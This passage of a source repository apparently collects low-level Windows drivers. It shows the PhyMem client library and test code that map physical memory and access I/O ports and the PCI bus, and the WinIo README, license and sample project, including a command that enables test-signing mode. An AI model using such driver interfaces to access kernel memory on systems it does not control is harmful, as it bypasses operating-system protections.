BOOL WritePCI(DWORD busNum, DWORD devNum, DWORD funcNum,
			  DWORD regOff, DWORD bytes, PVOID pValue)
{
	BOOL bRet=FALSE;
	DWORD dwBytes;
	PHYMEM_PCI pp;

	pp.dwBusNum=busNum;
	pp.dwDevNum=devNum;
	pp.dwFuncNum=funcNum;
	pp.dwRegOff=regOff;
	pp.dwBytes=bytes;

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		//we use out buffer for storing the new values to write
		//it's strange but it works (METHOD_OUT_DIRECT) and ease the driver
		bRet=DeviceIoControl(hDriver, IOCTL_PHYMEM_SETPCI, &pp,
			sizeof(PHYMEM_PCI), pValue, bytes, &dwBytes, NULL);
	}

	if (bRet && dwBytes==bytes)
		return TRUE;
	else
		return FALSE;
}

```

`source/WormholeDrivers/PHYMEM/PhyMem/pmdll/pmdll.dsp`:

```dsp
# Microsoft Developer Studio Project File - Name="pmdll" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=pmdll - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "pmdll.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "pmdll.mak" CFG="pmdll - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "pmdll - Win32 Release" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "pmdll - Win32 Debug" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "pmdll - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "PMDLL_EXPORTS" /YX /FD /c
# ADD CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "PMDLL_EXPORTS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /machine:I386 /out:"../Release/pmdll.dll"
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "pmdll - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "PMDLL_EXPORTS" /YX /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "PMDLL_EXPORTS" /YX /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /debug /machine:I386 /out:"../Debug/pmdll.dll" /pdbtype:sept

!ENDIF 

# Begin Target

# Name "pmdll - Win32 Release"
# Name "pmdll - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\initdrv.cpp
# End Source File
# Begin Source File

SOURCE=.\pmdll.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\phymem.h
# End Source File
# Begin Source File

SOURCE=.\pmdll.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project

```

`source/WormholeDrivers/PHYMEM/PhyMem/pmdll/pmdll.dsw`:

```dsw
Microsoft Developer Studio Workspace File, Format Version 6.00
# WARNING: DO NOT EDIT OR DELETE THIS WORKSPACE FILE!

###############################################################################

Project: "pmdll"=.\pmdll.dsp - Package Owner=<4>

Package=<5>
{{{
}}}

Package=<4>
{{{
}}}

###############################################################################

Global:

Package=<5>
{{{
}}}

Package=<3>
{{{
}}}

###############################################################################


```

`source/WormholeDrivers/PHYMEM/PhyMem/pmdll/pmdll.h`:

```h
#ifndef	__PMDLL_H
#define	__PMDLL_H

#ifdef	PMDLL_EXPORTS
#define	DLL_DECLARE __declspec(dllexport)
#else
#define	DLL_DECLARE __declspec(dllimport)
#endif

#ifdef __cplusplus
extern "C"
{
#endif

//driver initialize
DLL_DECLARE BOOL LoadPhyMemDriver();
DLL_DECLARE VOID UnloadPhyMemDriver();

//map physical memory to user space
DLL_DECLARE PVOID MapPhyMem(DWORD phyAddr, DWORD memSize);
DLL_DECLARE VOID  UnmapPhyMem(PVOID pVirAddr, DWORD memSize);

//access port
DLL_DECLARE BYTE  ReadPortByte(WORD portAddr);
DLL_DECLARE WORD  ReadPortWord(WORD portAddr);
DLL_DECLARE DWORD ReadPortLong(WORD portAddr);
DLL_DECLARE VOID  WritePortByte(WORD portAddr, BYTE portValue);
DLL_DECLARE VOID  WritePortWord(WORD portAddr, WORD portValue);
DLL_DECLARE VOID  WritePortLong(WORD portAddr, DWORD portValue);

//access PCI bus
DLL_DECLARE BOOL ReadPCI(DWORD busNum, DWORD devNum, DWORD funcNum,
						 DWORD regOff, DWORD bytes, PVOID pValue);
DLL_DECLARE BOOL WritePCI(DWORD busNum, DWORD devNum, DWORD funcNum,
						  DWORD regOff, DWORD bytes, PVOID pValue);

#ifdef __cplusplus
}
#endif

#endif	//__PMDLL_H
```

`source/WormholeDrivers/PHYMEM/PhyMem/test/pmdll.h`:

```h
#ifndef	__PMDLL_H
#define	__PMDLL_H

#ifdef	PMDLL_EXPORTS
#define	DLL_DECLARE __declspec(dllexport)
#else
#define	DLL_DECLARE __declspec(dllimport)
#endif

#ifdef __cplusplus
extern "C"
{
#endif

//driver initialize
DLL_DECLARE BOOL LoadPhyMemDriver();
DLL_DECLARE VOID UnloadPhyMemDriver();

//map physical memory to user space
DLL_DECLARE PVOID MapPhyMem(DWORD phyAddr, DWORD memSize);
DLL_DECLARE VOID  UnmapPhyMem(PVOID pVirAddr, DWORD memSize);

//access port
DLL_DECLARE BYTE  ReadPortByte(WORD portAddr);
DLL_DECLARE WORD  ReadPortWord(WORD portAddr);
DLL_DECLARE DWORD ReadPortLong(WORD portAddr);
DLL_DECLARE VOID  WritePortByte(WORD portAddr, BYTE portValue);
DLL_DECLARE VOID  WritePortWord(WORD portAddr, WORD portValue);
DLL_DECLARE VOID  WritePortLong(WORD portAddr, DWORD portValue);

//access PCI bus
DLL_DECLARE BOOL ReadPCI(DWORD busNum, DWORD devNum, DWORD funcNum,
						 DWORD regOff, DWORD bytes, PVOID pValue);
DLL_DECLARE BOOL WritePCI(DWORD busNum, DWORD devNum, DWORD funcNum,
						  DWORD regOff, DWORD bytes, PVOID pValue);

#ifdef __cplusplus
}
#endif

#endif	//__PMDLL_H
```

`source/WormholeDrivers/PHYMEM/PhyMem/test/test.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>
#include <malloc.h>
#include "pmdll.h"

int main()
{
	BOOL b=LoadPhyMemDriver();

	if (b==FALSE)
	{
		printf("load phymem.sys failed\n");
		exit(-1);
	}

	char *va=(char*)MapPhyMem(0xF7020, 20);
	printf("mapped virtual address = 0x%08x\n", va);
	UnmapPhyMem(va, 20);

/*
	DWORD d=ReadPortByte(0x379);
	WritePortLong(0x378, 10);
	d=ReadPortLong(0x378);
*/

	//enumerate PCI bus
	for (int bus=0; bus<=255; bus++)
	{
		for (int dev=0; dev<=31; dev++)
		{
			for (int func=0; func<=7; func++)
			{
				DWORD dev_ven;
				if (ReadPCI(bus, dev, func, 0, 4, &dev_ven))
				{
					if (LOWORD(dev_ven)!=0xFFFF)
						printf("Bus %d, Device %d, Function %d, Vendor ID 0x%x, Device ID 0x%x\n",
							bus, dev, func, LOWORD(dev_ven), HIWORD(dev_ven));
				}
			}
		}
	}

	printf("end");
	getchar();

	UnloadPhyMemDriver();
	return 0;
}

```

`source/WormholeDrivers/PHYMEM/PhyMem/test/test.dsp`:

```dsp
# Microsoft Developer Studio Project File - Name="test" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=test - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "test.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "test.mak" CFG="test - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "test - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE "test - Win32 Debug" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe

!IF  "$(CFG)" == "test - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /FD /c
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386 /out:"../Release/test.exe"

!ELSEIF  "$(CFG)" == "test - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "_MBCS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "_MBCS" /FD /GZ /c
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /debug /machine:I386 /out:"../Debug/test.exe" /pdbtype:sept

!ENDIF 

# Begin Target

# Name "test - Win32 Release"
# Name "test - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\test.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\pmdll.lib
# End Source File
# End Target
# End Project

```

`source/WormholeDrivers/PHYMEM/PhyMem/test/test.dsw`:

```dsw
Microsoft Developer Studio Workspace File, Format Version 6.00
# WARNING: DO NOT EDIT OR DELETE THIS WORKSPACE FILE!

###############################################################################

Project: "test"=.\test.dsp - Package Owner=<4>

Package=<5>
{{{
}}}

Package=<4>
{{{
}}}

###############################################################################

Global:

Package=<5>
{{{
}}}

Package=<3>
{{{
}}}

###############################################################################


```

`source/WormholeDrivers/WINIO/LICENSE`:

```
END USER LICENSE AGREEMENT

Software License Agreement for WinIo
The following terms apply to all files associated with the software unless
explicitly disclaimed in individual files.

IMPORTANT- PLEASE READ CAREFULLY: BY INSTALLING THE SOFTWARE (AS DEFINED BELOW),
OR COPYING THE SOFTWARE, YOU (EITHER ON BEHALF OF YOURSELF AS AN INDIVIDUAL OR
ON BEHALF OF AN ENTITY AS ITS AUTHORIZED REPRESENTATIVE) AGREE TO ALL OF THE
TERMS OF THIS END USER LICENSE AGREEMENT ("AGREEMENT") REGARDING YOUR USE OF
THE SOFTWARE. IF YOU DO NOT AGREE WITH ALL OF THE TERMS OF THIS AGREEMENT, DO
NOT INSTALL, COPY OR OTHERWISE USE THE SOFTWARE.

1. GRANT OF LICENSE: Subject to the terms below, Yariv Kaplan ("AUTHOR") hereby
grants you a non-exclusive, non-transferable, non-assignable license to install
and to use the downloadable version of WinIo ("SOFTWARE").

a. Redistributable Code. You may reproduce and distribute the object code form
of the SOFTWARE solely in conjunction with, and as part of, your application
("Permitted Application"); provided that you comply with the following:

If you redistribute any portion of the Redistributable Code, you agree that:

(i) you will only distribute the Redistributable Code in conjunction with, and
as part of, your Permitted Application which adds significant functionality to
the Redistributable Code and that distribution of the Permitted Application does
not compete with the AUTHOR's distribution of the SOFTWARE;

(ii) you will include a valid copyright notice on your Permitted Application;

(iii) you will not permit further redistribution of the Redistributable Code;

(iv) you will indemnify, hold harmless, and defend the AUTHOR from and against
any claims or lawsuits, including attorneys' fees, that arise or result from
the use or distribution of your Permitted Application.

b. License to use Source Code. You may not sell, lease, rent, transfer or
sublicense the source code of this SOFTWARE.

2. MODIFICATION: SOFTWARE Source Code may be modified without the prior written
permission of the AUTHOR. Any modifications made to the SOFTWARE will continue
to be subject to the terms and conditions of this AGREEMENT.

3. COPYRIGHT: All rights, title, and copyrights in and to the SOFTWARE and any
copies of the SOFTWARE are owned by the AUTHOR. The SOFTWARE is protected by
copyright laws and international treaty provisions. Therefore, you must treat
the SOFTWARE like any other copyrighted material.

4. TITLE: You acknowledge that no title to the intellectual property in the
SOFTWARE is transferred to you. Title, ownership, rights, and intellectual
property rights in and to the SOFTWARE shall remain the exclusive property of
the AUTHOR. The SOFTWARE is protected by copyright laws of the United States
and international treaties.

5. LIMITATION OF LIABILITY: You must assume the entire risk of using the
SOFTWARE.

IN NO EVENT SHALL THE AUTHOR BE LIABLE TO ANY PARTY FOR DIRECT, INDIRECT,
SPECIAL, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OF THIS
SOFTWARE, ITS DOCUMENTATION, OR ANY DERIVATIVES THEREOF, EVEN IF THE AUTHOR
HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

THE AUTHOR SPECIFICALLY DISCLAIMS ANY WARRANTIES, INCLUDING, BUT NOT LIMITED
TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
PURPOSE, AND NON-INFRINGEMENT. THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS,
AND THE AUTHOR HAS NO OBLIGATION TO PROVIDE MAINTENANCE, SUPPORT, UPDATES,
ENHANCEMENTS, OR MODIFICATIONS.

```

`source/WormholeDrivers/WINIO/README.md`:

```md
# WinIo

The WinIo library allows 32-bit and 64-bit Windows applications to directly access I/O ports and physical memory.

## Copyright

This library was written by Yariv Kaplan, which could be download from www.internals.com.

**WARNING!** This library is strictly copyrighted! All rights are claimed belongs to Yariv Kaplan (even the codes you modified). You must read the LICENESE of WinIo library carefully if you want to use this library (neither generated binaries or source code).

## Why have this repository?

Because www.internals.com is down latest, I couldn't download it, so fork this useful library for backup purpose.

The tag 2.0 is the version that supported win9X.

Lastest viewable content from www.internals.com could be access from [archive.org](http://web.archive.org/web/20160410042019/http://www.internals.com/) .

## Redistributable Files

The redistributable files are provided in the \binaries directory (WinIo32.dll, WinIo32.sys and WinIo64.dll) and should be included in the installation package for your application. The WinIo64.sys file must be replaced with a version that is signed with a public code signing certificate (see below).

The WinIo files must be placed in the same directory as your application's executable file.

## Privilege Requirements

WinIo requires administrative privileges to run properly. This can be achieved by:

- Using WinIo from a service running as LocalSystem (SE_LOAD_DRIVER_NAME privilege must be explicitly enabled).
- Embedding a manifest file in the application that requests privilege elevation.
- Requiring the user to choose the "Run as Administrator" option when launching the application.

The included C# samples demonstrate using an embedded manifest file to request privilege elevation.

## Driver Signing Requirements on 64-bit Systems

64-bit versions of Windows only load device drivers that are signed by a code signing certificate issued by a public CA such as Verisign, Thawte, etc. WinIo64.sys must not be deployed on production machines unless a code signing certificate is obtained and used to sign this file. The bundled copy of WinIo64.sys is signed with a self-signed certificate and can only be used on development/test machines with Windows running in a special "test" mode. In order to use the bundled version of WinIo64.sys, you need to take the following steps:

- Open an elevated command window by right-clicking the icon and clicking "Run as Administrator".
- Type the following command to enable test-signing:

  bcdedit.exe /set TESTSIGNING ON

- Reboot the machine

For more information on Windows driver signing requirements, please refer to http://www.microsoft.com/whdc/winlogo/drvsign/kmcs_walkthrough.mspx.

## More Help

If you want any further advance help information, just read the WinIo.chm which
bundled with released WinIo.zip .

```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 10.00
# Visual Studio 2008
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "DumpPhys", "DumpPhys\DumpPhys.csproj", "{1103585F-D85D-4599-8858-C0D3E9D7419F}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Debug|x86 = Debug|x86
		Release|Any CPU = Release|Any CPU
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Debug|x86.ActiveCfg = Debug|x86
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Debug|x86.Build.0 = Debug|x86
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Release|Any CPU.Build.0 = Release|Any CPU
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Release|x86.ActiveCfg = Release|x86
		{1103585F-D85D-4599-8858-C0D3E9D7419F}.Release|x86.Build.0 = Release|x86
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/DumpPhys.csproj`:

```csproj
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="3.5">
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProductVersion>9.0.21022</ProductVersion>
    <SchemaVersion>2.0</SchemaVersion>
    <ProjectGuid>{1103585F-D85D-4599-8858-C0D3E9D7419F}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>DumpPhys</RootNamespace>
    <AssemblyName>DumpPhys</AssemblyName>
    <FileUpgradeFlags>
    </FileUpgradeFlags>
    <OldToolsVersion>2.0</OldToolsVersion>
    <UpgradeBackupLocation>
    </UpgradeBackupLocation>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <ApplicationManifest>DumpPhys.manifest</ApplicationManifest>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
    <DebugSymbols>true</DebugSymbols>
    <OutputPath>bin\x86\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <DebugType>full</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
    <OutputPath>bin\x86\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <Optimize>true</Optimize>
    <DebugType>pdbonly</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Data" />
    <Reference Include="System.Deployment" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Windows.Forms" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Form1.cs">
      <SubType>Form</SubType>
    </Compile>
    <Compile Include="Form1.Designer.cs">
      <DependentUpon>Form1.cs</DependentUpon>
    </Compile>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <EmbeddedResource Include="Form1.resx">
      <SubType>Designer</SubType>
      <DependentUpon>Form1.cs</DependentUpon>
    </EmbeddedResource>
    <EmbeddedResource Include="Properties\Resources.resx">
      <Generator>ResXFileCodeGenerator</Generator>
      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
      <SubType>Designer</SubType>
    </EmbeddedResource>
    <Compile Include="Properties\Resources.Designer.cs">
      <AutoGen>True</AutoGen>
      <DependentUpon>Resources.resx</DependentUpon>
      <DesignTime>True</DesignTime>
    </Compile>
    <None Include="DumpPhys.manifest" />
    <None Include="Properties\Settings.settings">
      <Generator>SettingsSingleFileGenerator</Generator>
      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
    </None>
    <Compile Include="Properties\Settings.Designer.cs">
      <AutoGen>True</AutoGen>
      <DependentUpon>Settings.settings</DependentUpon>
      <DesignTimeSharedInput>True</DesignTimeSharedInput>
    </Compile>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include="Microsoft.Net.Framework.2.0">
      <Visible>False</Visible>
      <ProductName>.NET Framework 2.0 %28x86%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.0">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.0 %28x86%29</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
</Project>
```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/DumpPhys.manifest`:

```manifest
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Form1.Designer.cs`:

```cs
namespace DumpPhys
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
